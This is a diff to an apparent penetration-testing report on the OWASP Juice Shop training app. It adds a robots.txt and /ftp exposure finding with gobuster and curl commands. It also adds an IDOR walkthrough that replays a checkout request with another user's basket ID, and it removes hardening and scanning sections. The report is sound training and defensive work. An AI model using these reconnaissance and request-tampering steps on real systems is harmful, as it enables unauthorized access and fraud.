@@ -19,6 +19,19 @@
 
 ---
 
+## 🌐 What is OWASP?
+
+**OWASP** (Open Worldwide Application Security Project) is a **non-profit foundation** dedicated to improving software security. It provides free, community-driven resources including:
+
+- **OWASP Top 10** — the industry-standard list of the 10 most critical web application security risks, updated every few years based on real-world data from thousands of organizations.
+- **OWASP Juice Shop** — an intentionally vulnerable web application built specifically for security training, awareness demos, and penetration testing practice.
+- **OWASP ZAP** — a free, open-source automated security scanner used by developers and security professionals worldwide.
+- **OWASP Testing Guide** — a comprehensive methodology for web application penetration testing.
+
+All vulnerabilities documented in this report are mapped to the **OWASP Top 10 (2021 edition)**.
+
+---
+
 ## 📋 Table of Contents
 
 1. [Project Overview](#project-overview)
@@ -29,11 +42,10 @@
    - [2. Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
    - [3. Broken Authentication](#3-broken-authentication)
    - [4. Insecure Direct Object Reference (IDOR)](#4-insecure-direct-object-reference-idor)
-   - [5. Security Misconfiguration — Exposed Admin Panel](#5-security-misconfiguration--exposed-admin-panel)
+   - [5. Security Misconfiguration — robots.txt & FTP Exposure](#5-security-misconfiguration--robotstxt-reveals-sensitive-paths--ftp-exposure)
    - [6. Broken Access Control — Admin Basket Manipulation ⭐ Bonus](#6-broken-access-control--admin-basket-manipulation--bonus)
 5. [Ethical Hacking Report](#ethical-hacking-report)
-6. [Automated Scanning with OWASP ZAP](#automated-scanning-with-owasp-zap)
-7. [Resources](#resources)
+6. [Resources](#resources)
 
 ---
 
@@ -89,9 +101,9 @@ http://localhost:3000
 
 ---
 
-## Infrastructure Vulnerability Analysis
+## Infrastructure Vulnerability Analysis ⭐ Bonus
 
-> This section addresses the **Bonus objective** — analyzing the Dockerfile and container setup for infrastructure-level security issues.
+
 
 The OWASP Juice Shop Docker image (v20) was analyzed for infrastructure vulnerabilities:
 
@@ -104,23 +116,6 @@ The OWASP Juice Shop Docker image (v20) was analyzed for infrastructure vulnerab
 | 5 | **Port 3000 directly exposed** — No reverse proxy or TLS | High | CWE-319 |
 | 6 | **No secrets management** — JWT secret hardcoded in source | Critical | CWE-798 |
 | 7 | **Outdated Node.js dependencies** — npm audit reports known CVEs | High | CWE-1035 |
-
-### Recommended Hardening (Dockerfile)
-
-```dockerfile
-# Pin to a specific image digest or version tag for reproducibility
-FROM bkimminich/juice-shop:v20.2.0
-
-# As of v20+, the image natively utilizes a distroless environment 
-# and runs as a non-root user (USER 65532). No need to manually add groups/users.
-# (Previous versions required manual privilege dropping)
-
-# Use a reverse proxy (nginx) with TLS termination in production
-# Set resource limits at the docker run / compose level:
-# --memory="512m" --cpus="1.0"
-# Mount the filesystem read-only where possible:
-# --read-only --tmpfs /tmp
-```
 
 ---
 
@@ -329,46 +324,90 @@ Authorization: Bearer <your_jwt>
 
 ---
 
-### 5. Security Misconfiguration — Exposed Admin Panel
+### 5. Security Misconfiguration — robots.txt Reveals Sensitive Paths & FTP Exposure
 
 **OWASP Category**: A05:2021 — Security Misconfiguration  
 **Severity**: 🟠 High  
-**CWE**: CWE-200
+**CWE**: CWE-538 (File and Directory Information Exposure)
 
 #### Description
 
-The Juice Shop administration panel is accessible via a guessable URL without network-level restrictions.
+The application's `robots.txt` file is intended to instruct web crawlers not to index certain paths — but in doing so, it acts as a **roadmap for attackers**, explicitly listing sensitive directories. Additionally, the `/ftp` directory is publicly accessible with full directory listing enabled, exposing internal backup files.
 
 #### How It Was Exploited
 
-**Step 1** — Without any prior knowledge, run a directory brute-force scan:
+**Step 1** — Run a directory brute-force scan against the server-side endpoints (Juice Shop is a SPA so `--exclude-length` is required to filter the catch-all `index.html` response):
 
 ```bash
 gobuster dir -u http://localhost:3000 \
   -w /usr/share/wordlists/dirb/common.txt \
-  -t 50 --quiet
+  -t 50 --quiet \
+  --exclude-length 9393
 ```
 
-**Step 2** — Output reveals: `/#/administration`
+**Output**:
+```
+robots.txt           (Status: 200) [Size: 28]
+ftp                  (Status: 200) [Size: 11307]
+assets               (Status: 301) [Size: 156]
+promotion            (Status: 200) [Size: 5863]
+```
 
-**Step 3** — Navigate to `http://localhost:3000/#/administration`.
+**Step 2** — Fetch `robots.txt` to see which paths the application is trying to hide:
 
-**Step 4** — While a login is required to fully access it, the endpoint is fully discoverable. Combining this with the SQLi admin login yields full admin panel access: user listing, feedback management, order management.
+```bash
+curl http://localhost:3000/robots.txt
+```
+
+**Output**:
+```
+User-agent: *
+Disallow: /ftp
+```
+
+The `robots.txt` file **reveals the existence of `/ftp`** to any attacker who reads it.
+
+**Step 3** — Navigate to the exposed FTP directory:
+
+```bash
+curl http://localhost:3000/ftp/
+```
+
+The server returns a **full directory listing** of internal files including:
+
+```
+acquisitions.md
+eastere.gg
+package.json.bak
+suspicious_errors.yml
+```
+
+**Step 4** — Download sensitive files:
+
+```bash
+# Reveals all npm dependency versions — enabling targeted CVE research
+curl http://localhost:3000/ftp/package.json.bak
+
+# Internal business document
+curl http://localhost:3000/ftp/acquisitions.md
+```
 
 #### Impact
 
-- Enumeration of all registered users and their email addresses
-- Mass deletion of user feedback (integrity impact)
-- Platform management by unauthorized parties
+- `robots.txt` acts as a **secret map** — disclosing paths that were meant to be hidden
+- `package.json.bak` reveals all npm dependencies and exact versions, enabling targeted CVE exploitation
+- `acquisitions.md` exposes confidential internal business documents
+- No authentication is required to access any of these files
 
 #### Remediation
 
-1. **Network-level restriction** — Restrict admin routes to internal IP ranges or VPN.
-2. **Separate admin interface** — Run the admin portal on a different port/domain not reachable from the public internet.
-3. **Multi-factor authentication** — Require MFA for any administrative action.
-4. **Security headers** — Apply `X-Robots-Tag: noindex` and remove admin routes from `sitemap.xml`.
+1. **Never list sensitive paths in `robots.txt`** — use `X-Robots-Tag: noindex` HTTP headers instead.
+2. **Disable directory listing** — configure the web server to return 403/404 for directory index requests.
+3. **Remove backup files from web-accessible directories** — `.bak`, `.old`, `.orig` files must never be served publicly.
+4. **Move internal files** — store sensitive documents behind authenticated API endpoints, not in static file directories.
 
 ---
+
 
 ### 6. Broken Access Control — Admin Basket Manipulation ⭐ Bonus
 
@@ -378,34 +417,50 @@ gobuster dir -u http://localhost:3000 \
 
 #### Description
 
-A logged-in user can place orders on behalf of other users and manipulate quantities, because the API trusts the user-supplied basket ID in the request body.
+The checkout API endpoint uses a basket ID embedded in the **URL path** to identify whose basket to process. The server never validates that the authenticated user actually owns that basket — allowing any logged-in user to checkout (place an order) on behalf of any other user.
 
 #### How It Was Exploited
 
-**Step 1** — Log in as a regular user. Add an item to your cart and intercept the checkout API call:
+**Step 1** — Log in as a regular user (`jim@juice-sh.op`) and add an item to the cart. Intercept the checkout request using Burp Suite / OWASP ZAP:
 
 ```http
-POST /api/BasketItems HTTP/1.1
+POST /rest/basket/2/checkout HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer <jim_jwt>
 Content-Type: application/json
-Authorization: Bearer <user_jwt>
 
-{"ProductId":1,"BasketId":"2","quantity":1}
+{"couponData":"bnVsbA==","orderDetails":{"paymentId":"5","addressId":"4","deliveryMethodId":"3"}}
 ```
 
-**Step 2** — Change `"BasketId"` to `"1"` (admin's basket) and resend.
+The number `2` in the URL is Jim's basket ID (visible in the JWT payload: `"bid":2`).
 
-**Step 3** — The item is added to the admin's cart — confirmed by logging in as admin.
+**Step 2** — Change the basket ID in the URL from `2` to `1` (the admin's basket) and forward the request — keeping Jim's JWT unchanged:
+
+```http
+POST /rest/basket/1/checkout HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer <jim_jwt>
+Content-Type: application/json
+
+{"couponData":"bnVsbA==","orderDetails":{"paymentId":"5","addressId":"4","deliveryMethodId":"3"}}
+```
+
+**Step 3** — The server responds with HTTP **200 OK** and processes the checkout against the **admin's basket** — using Jim's session. The admin's order history now shows a fraudulent order placed without their knowledge.
+
+> **Why it works**: The server extracts the basket ID from the URL path and queries it directly from the database without checking `WHERE userId = authenticatedUserId`.
 
 #### Impact
 
-- Fraudulent orders placed against victim accounts
-- Price manipulation (setting `quantity` to `0` or negative values to receive discounts)
-- Denial of service against specific user accounts
+- **Fraudulent orders** placed against any user account without their knowledge or consent
+- **Financial manipulation** — an attacker could empty or manipulate another user's cart before checkout
+- **Privacy violation** — the basket contents (items, delivery address, payment method ID) of any user are exposed
+- **Privilege escalation via chaining** — combine with SQLi admin login to manipulate high-value accounts
 
 #### Remediation
 
-1. **Derive basket ID from the authenticated session** — Never accept `BasketId` from user-supplied request body.
-2. **Authorization middleware** — Validate resource ownership at the API gateway or middleware layer.
+1. **Derive basket ID from the authenticated JWT** — the server must look up the basket by `userId` from the token, never from the URL path or request body.
+2. **Authorization middleware** — add a guard on every basket endpoint that asserts `basket.userId === req.user.id`.
+3. **Audit logging** — log and alert on checkout requests where the URL basket ID does not match the JWT `bid` claim.
 
 ---
 
@@ -486,48 +541,6 @@ As a Security Consultant / Penetration Tester, the following professional standa
 
 ---
 
-## Automated Scanning with OWASP ZAP
-
-> This section addresses the **Bonus objective** — automated vulnerability scanning.
-
-### Setup
-
-```bash
-# Pull and run OWASP ZAP
-docker pull ghcr.io/zaproxy/zaproxy:stable
-
-# Run automated baseline scan against Juice Shop
-docker run -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
-    -t http://host.docker.internal:3000 \
-    -r zap_report.html
-```
-
-### Key Findings from ZAP Automated Scan
-
-| Alert | Risk | CWE | Description |
-|-------|------|-----|-------------|
-| X-Content-Type-Options Missing | Low | CWE-693 | Browser MIME sniffing not disabled |
-| X-Frame-Options Missing | Medium | CWE-1021 | Clickjacking protection absent |
-| Content-Security-Policy Missing | Medium | CWE-693 | No CSP header to prevent XSS |
-| Strict-Transport-Security Missing | Low | CWE-311 | HSTS not enforced |
-| Cookie Without SameSite Attribute | Low | CWE-352 | CSRF risk on session cookies |
-| SQL Injection | High | CWE-89 | Confirmed on login endpoint |
-| XSS (Reflected) | High | CWE-79 | Confirmed on search parameter |
-| Directory Browsing | Medium | CWE-548 | `/ftp/` listing enabled |
-
-### ZAP Active Scan Commands
-
-```bash
-# Full active scan (aggressive — only run on authorized targets)
-docker run -t ghcr.io/zaproxy/zaproxy:stable zap-full-scan.py \
-    -t http://host.docker.internal:3000 \
-    -r zap_full_report.html \
-    -J zap_full_report.json
-```
-
-> ⚠️ Active scanning sends attack payloads to the target. **Only run active scans on systems you are explicitly authorized to test.**
-
----
 
 ## Resources
 
